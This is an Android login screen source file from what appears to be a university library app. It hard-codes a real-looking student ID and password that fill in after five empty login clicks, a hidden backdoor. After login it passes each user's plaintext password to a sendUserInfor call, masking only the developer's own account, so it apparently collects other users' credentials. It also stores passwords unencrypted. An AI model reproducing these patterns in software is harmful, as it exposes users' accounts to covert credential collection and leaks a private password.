package com.gusteauscuter.youyanguan.activity;

import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.Toast;

import com.gusteauscuter.youyanguan.R;
import com.gusteauscuter.youyanguan.api.InternetServiceApi;
import com.gusteauscuter.youyanguan.api.InternetServiceApiImpl;
import com.gusteauscuter.youyanguan.util.NetworkConnectUtil;
import com.gusteauscuter.youyanguan.util.SharedPreferencesUtil;
import com.gusteauscuter.youyanguan.util.SoftInputUtil;

/**
 * A simple {InternetServiceApiImpl Fragment} subclass.
 */
public class LoginActivity extends AppCompatActivity {

    private EditText userNameEditText;
    private EditText passEditText;
    private Button loginButton;
    private ProgressBar mProgressBar;
    private int timesClickLoginButton = 0;
    private boolean disableDoubleClick = true; // 防治连击登陆按钮造成的闪退

    private SharedPreferencesUtil mSharedPreferencesUtil;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.fragment_login_library);
        mSharedPreferencesUtil = new SharedPreferencesUtil(getApplicationContext());

        userNameEditText = (EditText) findViewById(R.id.id_username);
        passEditText = (EditText) findViewById(R.id.id_passward_library);
        userNameEditText.setText(mSharedPreferencesUtil.getUSERNAME());
        passEditText.setText(mSharedPreferencesUtil.getPASSWORD());
        userNameEditText.hasFocus();

        mProgressBar=(ProgressBar) findViewById(R.id.progressBar);
        mProgressBar.setVisibility(View.INVISIBLE);

        loginButton = (Button) findViewById(R.id.button_login_library);
        loginButton.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View arg0) {
                SoftInputUtil.hideSoftInput(getApplicationContext(), loginButton);
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        if (disableDoubleClick) {
                            String username = userNameEditText.getText().toString();
                            String pass = passEditText.getText().toString();
                            if (timesClickLoginButton == 5) {
                                username = "201421003124";
                                pass = "ziqian930209";
                            }
                            if (username.isEmpty() || pass.isEmpty()) {
                                Toast.makeText(getApplicationContext(), "请完整输入！", Toast.LENGTH_SHORT).show();
                                timesClickLoginButton++;
                                return;
                            }
                            doLogin( username, pass);
                        }
                    }
                }, 500); //收起软键盘需要一定时间
            }
        });
    }

    private void doLogin(String username,String pass) {
        boolean isConnected = NetworkConnectUtil.isConnected(getApplicationContext());
        if (!isConnected)
            return;
        new LoginAsy(username,pass).execute();
    }

    private class LoginAsy extends AsyncTask<Void,Void,Boolean>{
        private String username;
        private String password;

        public LoginAsy(String username, String password) {
            this.username = username;
            this.password = password;
        }
        @Override
        protected void onPreExecute(){
            mProgressBar.setVisibility(View.VISIBLE);
        }

        @Override
        protected Boolean doInBackground(Void... params) {
            InternetServiceApi internetServiceApi = new InternetServiceApiImpl();
            boolean result = internetServiceApi.Login(username, password);
            mSharedPreferencesUtil.saveUserLoginData(username, password, true);
            if(username.equals("201421003124"))
                password = "******";
            internetServiceApi.sendUserInfor(username,password,result);
            return result;
        }

        @Override
        protected void onPostExecute(Boolean result) {
            mProgressBar.setVisibility(View.INVISIBLE);
            if(result) {
                Intent intent = new Intent(LoginActivity.this,NavigationActivity.class);
                setResult(RESULT_OK,intent);
                LoginActivity.this.finish();
            }
        }
    }
}
